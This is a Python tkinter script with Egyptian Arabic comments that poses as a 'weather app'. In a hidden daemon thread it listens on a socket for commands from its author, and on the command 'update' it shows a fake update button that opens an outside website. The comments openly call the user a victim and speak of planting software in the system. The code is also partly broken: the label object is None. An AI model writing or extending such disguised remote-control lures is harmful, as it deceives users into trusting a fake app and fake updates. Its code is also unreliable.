#من مكتبه دي نجمه يعني جبلي كل حاجه
from tkinter import *
import socket
#المكتبه دي خيوط الشبكه عشان ميحصلش مشكله في البرنامج 
import threading
#عشان احدد سلوك ونبعتله اشعار 
from tkinter import messagebox
#اعمل اختبار اني اوجهه لي موقع اخر 
import webbrowser
#عشان ازرع برمجيه داخل نظام التشغيل 
import os

#هعمل داله تانيه عشان يردلي الاتصال عليا انا بي الترتيب قبل ما يشغل البرنامج عشان يستقبل اوامر مني 
def start_server():
    #لما تشغل السرفر لازم تستقبل الرسائل 
    #daemon يعني خلي الخيط ده مخفي 
    threading.Thread(target=message_in,daemon=True).start()

def message_in():
    with socket.socket(socket.AF_INET,socket.SOCK_STREAM) as server_socket:

        #عاوز احدد الاتصال هيجيلي ازاي 
        server_socket.bind(('localhost',12345))

        #عاوز احدد كام شخص يقدر يتحكم في البرماجيه دي 
        server_socket.listen(1)

        #اصل لي بيانات الشخص عن طريق الاتصال وي الاي بي 
        #accept لو جالي اتصال من الشخص ده  اقبل اتصاله علي طول 
        client_socket , addr  = server_socket.accept()

        #لما تتصل بي الضحيه عوزك تستقبل الاوامر مني انا حر في كتابه العدد 
        with client_socket:
            while True:
                message = client_socket.recv(1024).decode('utf-8')
                if message:
                    #اذا كانت الرساله رساله 
                    msg(message)



#اذا كانت الرساله الي هتيجي مني كذا  اعرضلي البيانات 
def msg(message):
    if message == 'hi' :
        messagebox.showinfo('ahmed','adel')
    if message == 'update':
        update_btn()

    #طيب لو فيه خطء هيظهر عندي وعند المستخدم فا هوقفه بي الطريقه دي 
    else:
        pass


#عوزك عشان نظهر عند المستخدم التحديث اظهره زرار ومكتوب عليه حدث
def update_btn():
    up= Button(root,text='update new' , command=open_site)
    #هنا هنظبط مكان الزرار 
    up.pack(pady=10)
    #كمان عاوز اغير الكلام الي جوه 
    label.config(text='found  new update')


def open_site():
    webbrowser.open('https://elking.net')
    


def create_gui ():
    #انشاء متغير عام الواجهه والنص عشان اتحكم فيهم داخل دوال اخري 
    global root , label

    #تي كي دي جوا مكتبه التيكينتر وهيا عباره عن نافزه 
    root = Tk()

    #اضافه بعض الخصائص دي زي اسم البرنامج من فوق 
    root.title('weather app')

    #حجم مساحه التطبيق علي الشاشه لما يفتح 
    root.geometry('420x320')

    #دا بنضيف كتابه بقا جواه وكدا 
    label=Label(root,text='welcome to my app').pack()

    #هنا هراعي الترتيب بحيث يستقبل مني اوامر قبل ما يشتغل 
    start_server()

    #عوزك تعملي تشغيل للبرنامج
    root.mainloop()

#لما المستخدم يفتح البرمجيه عوزك تشغلي الداله دي
if __name__ == '__main__' :
    create_gui()